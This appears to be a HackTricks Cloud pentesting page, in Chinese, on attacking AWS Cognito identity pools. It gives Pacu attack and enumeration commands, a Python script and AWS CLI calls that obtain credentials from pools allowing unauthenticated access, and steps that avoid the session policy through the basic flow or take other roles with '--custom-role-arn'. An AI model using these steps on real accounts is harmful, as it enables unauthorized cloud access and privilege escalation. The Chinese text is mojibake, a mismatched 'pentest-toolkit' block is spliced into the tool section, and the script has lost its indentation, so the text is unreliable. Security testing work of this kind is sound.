# Cognitoèº«ä»½æ± 

<details>

<summary><strong>æ”¯æŒHackTrickså¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—®PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricksï¼Œè¯·æŸ¥çœ‹[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) **å’Œ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## åŸºæœ¬ä¿¡æ¯

ä½¿ç”¨èº«ä»½æ± ï¼Œæ‚¨çš„ç”¨æˆ·å¯ä»¥**è·å–ä¸´æ—¶çš„AWSå‡­è¯æ¥è®¿é—®AWSæœåŠ¡**ï¼Œä¾‹å¦‚Amazon S3å’ŒDynamoDBã€‚èº«ä»½æ± æ”¯æŒåŒ¿åè®¿å®¢ç”¨æˆ·ï¼Œä»¥åŠä»¥ä¸‹èº«ä»½æä¾›è€…ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨å®ƒä»¬æ¥å¯¹èº«ä»½æ± çš„ç”¨æˆ·è¿›è¡Œèº«ä»½éªŒè¯ï¼š

* Amazon Cognitoç”¨æˆ·æ± 
* é€šè¿‡Facebookã€Googleã€Login with Amazonå’ŒSign in with Appleè¿›è¡Œç¤¾äº¤ç™»å½•
* OpenID Connect (OIDC)æä¾›è€…
* SAMLèº«ä»½æä¾›è€…
* å¼€å‘è€…è®¤è¯èº«ä»½

### Cognito Sync

è¦ç”Ÿæˆèº«ä»½æ± ä¼šè¯ï¼Œé¦–å…ˆéœ€è¦**ç”Ÿæˆä¸€ä¸ªèº«ä»½ID**ã€‚è¿™ä¸ªèº«ä»½IDæ˜¯**è¯¥ç”¨æˆ·ä¼šè¯çš„æ ‡è¯†**ã€‚è¿™äº›æ ‡è¯†å¯ä»¥æœ‰å¤šè¾¾20ä¸ªæ•°æ®é›†ï¼Œæ¯ä¸ªæ•°æ®é›†å¯ä»¥å­˜å‚¨å¤šè¾¾1MBçš„é”®å€¼å¯¹ã€‚

è¿™å¯¹äº**ä¿ç•™ç”¨æˆ·ä¿¡æ¯**ï¼ˆå§‹ç»ˆä½¿ç”¨ç›¸åŒçš„èº«ä»½IDçš„ç”¨æˆ·ï¼‰éå¸¸æœ‰ç”¨ã€‚

æ­¤å¤–ï¼ŒæœåŠ¡**cognito-sync**æ˜¯å…è®¸**ç®¡ç†å’ŒåŒæ­¥è¿™äº›ä¿¡æ¯**çš„æœåŠ¡ï¼ˆåœ¨æ•°æ®é›†ä¸­å‘é€ä¿¡æ¯ã€æµå’ŒSNSæ¶ˆæ¯ç­‰ï¼‰ã€‚

### ç”¨äºæ¸—é€æµ‹è¯•å’Œæšä¸¾çš„Pacuæ¨¡å—

[Pacu](https://github.com/RhinoSecurityLabs/pacu)ï¼ŒAWSåˆ©ç”¨æ¡†æ¶ï¼Œç°åœ¨åŒ…æ‹¬â€œcognito__enumâ€å’Œâ€œcognito__attackâ€æ¨¡å—ï¼Œç”¨äºè‡ªåŠ¨æšä¸¾è´¦æˆ·ä¸­æ‰€æœ‰Cognitoèµ„äº§ï¼Œå¹¶æ ‡è®°å¼±é…ç½®ã€ç”¨äºè®¿é—®æ§åˆ¶çš„ç”¨æˆ·å±æ€§ç­‰ï¼Œå¹¶è‡ªåŠ¨åˆ›å»ºç”¨æˆ·ï¼ˆåŒ…æ‹¬MFAæ”¯æŒï¼‰å’ŒåŸºäºå¯ä¿®æ”¹çš„è‡ªå®šä¹‰å±æ€§ã€å¯ç”¨çš„èº«ä»½æ± å‡­è¯ã€idä»¤ç‰Œä¸­çš„å¯å‡å®šè§’è‰²ç­‰è¿›è¡Œç‰¹æƒå‡çº§ã€‚

æœ‰å…³æ¨¡å—åŠŸèƒ½çš„æè¿°ï¼Œè¯·å‚è§[åšå®¢æ–‡ç« ](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2)çš„ç¬¬2éƒ¨åˆ†ã€‚æœ‰å…³å®‰è£…è¯´æ˜ï¼Œè¯·å‚è§ä¸»è¦çš„[Pacu](https://github.com/RhinoSecurityLabs/pacu)é¡µé¢ã€‚

### ç”¨æ³•

ç¤ºä¾‹cognito__attackç”¨æ³•ï¼Œå°è¯•å¯¹ç»™å®šçš„èº«ä»½æ± å’Œç”¨æˆ·æ± å®¢æˆ·ç«¯è¿›è¡Œç”¨æˆ·åˆ›å»ºå’Œæ‰€æœ‰ç‰¹æƒå‡çº§å‘é‡çš„æ”»å‡»ï¼š
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
ä»¥ä¸‹æ˜¯ä½¿ç”¨cognito__enumçš„ç¤ºä¾‹ï¼Œç”¨äºæ”¶é›†å½“å‰AWSè´¦æˆ·ä¸­å¯è§çš„æ‰€æœ‰ç”¨æˆ·æ± ã€ç”¨æˆ·æ± å®¢æˆ·ç«¯ã€èº«ä»½æ± ã€ç”¨æˆ·ç­‰ä¿¡æ¯ã€‚

```bash
cognito__enum --all
```

æ­¤å‘½ä»¤å°†æ‰§è¡Œå…¨é¢çš„æšä¸¾ï¼Œä»¥è·å–æ‰€æœ‰ç”¨æˆ·æ± ã€ç”¨æˆ·æ± å®¢æˆ·ç«¯ã€èº«ä»½æ± å’Œç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯ã€‚
```bash
Pacu (new:test) > run cognito__enum
```
### æ¸—é€æµ‹è¯•å·¥å…·

[Cognito Scanner](https://github.com/padok-team/cognito-scanner) æ˜¯ä¸€ä¸ªä½¿ç”¨Pythonç¼–å†™çš„CLIå·¥å…·ï¼Œç”¨äºå¯¹Cognitoæ‰§è¡Œä¸åŒçš„æ”»å‡»ï¼ŒåŒ…æ‹¬éæ³•è´¦æˆ·åˆ›å»ºå’Œèº«ä»½æ± å‡çº§ã€‚

#### å®‰è£…
```bash
$ pip install cognito-scanner
```
#### ç”¨æ³•

#### Enumerate Identity Pools

#### æšä¸¾èº«ä»½æ± 

The `cognito-identity-pools` module is used to enumerate identity pools in AWS Cognito. It retrieves information about the identity pools, such as the pool name, ID, and ARN.

`cognito-identity-pools` æ¨¡å—ç”¨äºæšä¸¾ AWS Cognito ä¸­çš„èº«ä»½æ± ã€‚å®ƒæ£€ç´¢æœ‰å…³èº«ä»½æ± çš„ä¿¡æ¯ï¼Œä¾‹å¦‚æ± åç§°ã€ID å’Œ ARNã€‚

To use this module, you need to provide valid AWS credentials with the necessary permissions to access Cognito.

è¦ä½¿ç”¨æ­¤æ¨¡å—ï¼Œæ‚¨éœ€è¦æä¾›æœ‰æ•ˆçš„ AWS å‡­è¯ï¼Œå¹¶å…·æœ‰è®¿é—® Cognito çš„å¿…è¦æƒé™ã€‚

```plaintext
$ pentest-toolkit aws-cognito-enum cognito-identity-pools --access-key <AWS_ACCESS_KEY> --secret-key <AWS_SECRET_KEY> --region <AWS_REGION>
```

Replace `<AWS_ACCESS_KEY>`, `<AWS_SECRET_KEY>`, and `<AWS_REGION>` with your AWS credentials and desired region.

å°† `<AWS_ACCESS_KEY>`ã€`<AWS_SECRET_KEY>` å’Œ `<AWS_REGION>` æ›¿æ¢ä¸ºæ‚¨çš„ AWS å‡­è¯å’Œæ‰€éœ€çš„åŒºåŸŸã€‚

The module will then enumerate the identity pools and display the retrieved information.

ç„¶åï¼Œè¯¥æ¨¡å—å°†æšä¸¾èº«ä»½æ± å¹¶æ˜¾ç¤ºæ£€ç´¢åˆ°çš„ä¿¡æ¯ã€‚
```bash
$ cognito-scanner --help
```
æ›´å¤šä¿¡æ¯è¯·æŸ¥çœ‹https://github.com/padok-team/cognito-scanner

## è®¿é—®IAMè§’è‰²

### æœªç»èº«ä»½éªŒè¯

åœ¨Cognitoåº”ç”¨ç¨‹åºä¸­ï¼Œä½œä¸ºæœªç»èº«ä»½éªŒè¯çš„ç”¨æˆ·ï¼Œæ”»å‡»è€…å”¯ä¸€éœ€è¦çŸ¥é“çš„å°±æ˜¯**èº«ä»½æ± ID**ï¼Œå¹¶ä¸”è¿™ä¸ª**IDå¿…é¡»åœ¨Web/ç§»åŠ¨åº”ç”¨ç¨‹åºä¸­ç¡¬ç¼–ç **ä»¥ä¾›å…¶ä½¿ç”¨ã€‚ä¸€ä¸ªIDçœ‹èµ·æ¥åƒè¿™æ ·ï¼š`eu-west-1:098e5341-8364-038d-16de-1865e435da3b`ï¼ˆæ— æ³•é€šè¿‡æš´åŠ›ç ´è§£è·å¾—ï¼‰ã€‚

{% hint style="success" %}
é€šè¿‡é»˜è®¤æ–¹å¼åˆ›å»ºçš„**IAM Cognitoæœªç»èº«ä»½éªŒè¯è§’è‰²**è¢«ç§°ä¸º`Cognito_<Identity Poolåç§°>Unauth_Role`
{% endhint %}

å¦‚æœä½ å‘ç°ä¸€ä¸ªç¡¬ç¼–ç çš„èº«ä»½æ± IDå…è®¸æœªç»èº«ä»½éªŒè¯çš„ç”¨æˆ·è®¿é—®ï¼Œä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•è·å–AWSå‡­è¯ï¼š
```python
import requests

region = "us-east-1"
id_pool_id = 'eu-west-1:098e5341-8364-038d-16de-1865e435da3b'
url = f'https://cognito-identity.{region}.amazonaws.com/'
headers = {"X-Amz-Target": "AWSCognitoIdentityService.GetId", "Content-Type": "application/x-amz-json-1.1"}
params = {'IdentityPoolId': id_pool_id}

r = requests.post(url, json=params, headers=headers)
json_resp = r.json()

if not "IdentityId" in json_resp:
print(f"Not valid id: {id_pool_id}")
exit

IdentityId = r.json()["IdentityId"]

params = {'IdentityId': IdentityId}

headers["X-Amz-Target"] = "AWSCognitoIdentityService.GetCredentialsForIdentity"
r = requests.post(url, json=params, headers=headers)

print(r.json())
```
æˆ–è€…æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹çš„ **aws cli å‘½ä»¤**ï¼š
```bash
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign
aws cognito-identity get-credentials-for-identity --identity-id <identity_id> --no-sign
```
{% hint style="warning" %}
è¯·æ³¨æ„ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œæœªç»èº«ä»½éªŒè¯çš„Cognitoç”¨æˆ·**æ— æ³•è·å¾—ä»»ä½•æƒé™ï¼Œå³ä½¿é€šè¿‡ç­–ç•¥åˆ†é…äº†æƒé™**ã€‚è¯·æŸ¥çœ‹ä»¥ä¸‹éƒ¨åˆ†ã€‚
{% endhint %}

### å¢å¼ºè®¤è¯æµç¨‹ä¸åŸºæœ¬è®¤è¯æµç¨‹

å‰ä¸€èŠ‚éµå¾ªäº†**é»˜è®¤çš„å¢å¼ºè®¤è¯æµç¨‹**ã€‚è¯¥æµç¨‹ä¸ºç”Ÿæˆçš„IAMè§’è‰²ä¼šè¯è®¾ç½®äº†ä¸€ä¸ª**é™åˆ¶æ€§çš„**[**ä¼šè¯ç­–ç•¥**](../../aws-basic-information/#session-policies)ã€‚è¯¥ç­–ç•¥åªå…è®¸ä¼šè¯ä½¿ç”¨[**æ­¤åˆ—è¡¨ä¸­çš„æœåŠ¡**](https://docs.aws.amazon.com/cognito/latest/developerguide/iam-roles.html#access-policies-scope-down-services)ï¼ˆå³ä½¿è§’è‰²å…·æœ‰è®¿é—®å…¶ä»–æœåŠ¡çš„æƒé™ï¼‰ã€‚

ç„¶è€Œï¼Œå¦‚æœ**èº«ä»½æ± å¯ç”¨äº†"åŸºæœ¬ï¼ˆç»å…¸ï¼‰æµç¨‹"**ï¼Œç”¨æˆ·å°†èƒ½å¤Ÿä½¿ç”¨è¯¥æµç¨‹è·å–ä¼šè¯ï¼Œè¯¥ä¼šè¯**ä¸ä¼šæœ‰é™åˆ¶æ€§çš„ä¼šè¯ç­–ç•¥**ã€‚

{% code overflow="wrap" %}
```bash
# Get auth ID
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign

# Get login token
aws cognito-identity get-open-id-token --identity-id <identity_id> --no-sign

# Use login token to get IAM session creds
## If you don't know the role_arn use the previous enhanced flow to get it
aws sts assume-role-with-web-identity --role-arn "arn:aws:iam::<acc_id>:role/<role_name>" --role-session-name sessionname --web-identity-token <token> --no-sign
```
{% endcode %}

{% hint style="warning" %}
å¦‚æœæ‚¨æ”¶åˆ°æ­¤**é”™è¯¯**ï¼Œé‚£æ˜¯å› ä¸º**åŸºæœ¬æµç¨‹æœªå¯ç”¨ï¼ˆé»˜è®¤ï¼‰**

`An error occurred (InvalidParameterException) when calling the GetOpenIdToken operation: Basic (classic) flow is not enabled, please use enhanced flow.`
{% endhint %}

æ‹¥æœ‰ä¸€ç»„ IAM å‡­æ®åï¼Œæ‚¨åº”è¯¥æ£€æŸ¥[æ‚¨æ‹¥æœ‰çš„è®¿é—®æƒé™](../../#whoami)å¹¶å°è¯•[æå‡æƒé™](../../aws-privilege-escalation/)ã€‚

### å·²è®¤è¯

{% hint style="info" %}
è¯·è®°ä½ï¼Œ**å·²è®¤è¯ç”¨æˆ·**å¯èƒ½ä¼šè¢«æˆäºˆ**ä¸åŒçš„æƒé™**ï¼Œå› æ­¤å¦‚æœæ‚¨å¯ä»¥åœ¨åº”ç”¨ç¨‹åºå†…**æ³¨å†Œ**ï¼Œè¯·å°è¯•è¿™æ ·åšå¹¶è·å–æ–°çš„å‡­æ®ã€‚
{% endhint %}

å¯¹äº**å·²è®¤è¯ç”¨æˆ·è®¿é—®èº«ä»½æ± **ï¼Œå¯èƒ½è¿˜å¯ä»¥ä½¿ç”¨**è§’è‰²**ã€‚

ä¸ºæ­¤ï¼Œæ‚¨å¯èƒ½éœ€è¦è®¿é—®**èº«ä»½æä¾›è€…**ã€‚å¦‚æœæ˜¯**Cognito ç”¨æˆ·æ± **ï¼Œä¹Ÿè®¸æ‚¨å¯ä»¥æ»¥ç”¨é»˜è®¤è¡Œä¸ºå¹¶**è‡ªå·±åˆ›å»ºæ–°ç”¨æˆ·**ã€‚

{% hint style="success" %}
é€šè¿‡ IAM Cognito è®¤è¯è§’è‰²é»˜è®¤ç§°ä¸º `Cognito_<Identity Pool name>Auth_Role`
{% endhint %}

æ— è®ºå¦‚ä½•ï¼Œ**ä»¥ä¸‹ç¤ºä¾‹**å‡è®¾æ‚¨å·²ç»ç™»å½•åˆ°ç”¨äºè®¿é—®èº«ä»½æ± çš„**Cognito ç”¨æˆ·æ± **ä¸­ï¼ˆä¸è¦å¿˜è®°è¿˜å¯ä»¥é…ç½®å…¶ä»–ç±»å‹çš„èº«ä»½æä¾›è€…ï¼‰ã€‚

<pre class="language-bash"><code class="lang-bash">aws cognito-identity get-id \
--identity-pool-id &#x3C;identity_pool_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>

# ä»ä¸Šä¸€ä¸ªå‘½ä»¤çš„å“åº”ä¸­è·å– identity_id
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>


# åœ¨ IdToken ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°ç”¨æˆ·å› ä¸ºç”¨æˆ·æ± ç»„è€Œå…·æœ‰è®¿é—®æƒé™çš„è§’è‰²
# ä½¿ç”¨ --custom-role-arn è·å–ç‰¹å®šè§’è‰²çš„å‡­æ®
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
<strong>    --custom-role-arn &#x3C;role_arn> \
</strong>    --logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>
</code></pre>

{% hint style="warning" %}
å¯èƒ½ä¼šæ ¹æ®ç”¨æˆ·ç™»å½•çš„**èº«ä»½æä¾›è€…**æˆ–ç”šè‡³ä»…æ ¹æ®**ç”¨æˆ·**ï¼ˆä½¿ç”¨å£°æ˜ï¼‰é…ç½®ä¸åŒçš„ IAM è§’è‰²ã€‚å› æ­¤ï¼Œå¦‚æœæ‚¨å¯ä»¥é€šè¿‡ç›¸åŒæˆ–ä¸åŒçš„æä¾›è€…è®¿é—®ä¸åŒçš„ç”¨æˆ·ï¼Œç™»å½•å¹¶è®¿é—®æ‰€æœ‰ç”¨æˆ·çš„ IAM è§’è‰²å¯èƒ½æ˜¯**å€¼å¾—çš„**ã€‚
{% endhint %}

<details>

<summary><strong>æ”¯æŒ HackTricks å¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨å¸Œæœ›åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**ï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—®**PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ PDF æ ¼å¼çš„ HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹ PEASS å’Œ HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
